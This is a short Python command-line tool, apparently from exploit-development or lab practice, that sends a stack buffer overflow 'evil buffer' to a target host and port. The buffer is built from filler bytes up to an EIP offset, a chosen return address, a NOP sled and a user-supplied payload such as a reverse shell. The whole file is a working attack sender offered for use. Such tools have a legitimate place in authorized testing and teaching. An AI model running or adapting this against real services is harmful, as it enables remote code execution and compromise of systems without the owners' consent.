import socket
import click

# TODO: Fuzzing mode?
# TODO: Interactive mode?
#   - Send messages as a live session
#   - Prepare malicious message beforehand, for example
# TODO: Option to print out malicious message


@click.command()
@click.argument('address')
@click.argument('port', type=int)
@click.option('--payload', default='',  # TODO: Find a nice flag
              help='The payload to send, e.g. a reverse shell')
@click.option('--offset', '-o', default=0,
              help='Offset to EIP, determining the input size by: '
              + 'overflow-char * OFFSET ')
@click.option('--overflow-char', default='\x90')
@click.option('--return-address', '-r', default='',
              help='Address to write into the EIP. Follows the '
              + 'overflow input')
@click.option('--padding', default=0, help='Amount of NOPs to be inserted '
              + 'return address and payload')
def main(address, port, payload, offset, overflow_char, return_address,
         padding):
    overflow = overflow_char * offset

    message = overflow + return_address + '\x90' * padding + payload

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address, port))
        print("Sending evil buffer...")
        s.send(str.encode(message + "\r\n"))
        print("Done!")
    except Exception as e:
        print("Could not connect.")
        print(e)


if __name__ == '__main__':
    main()
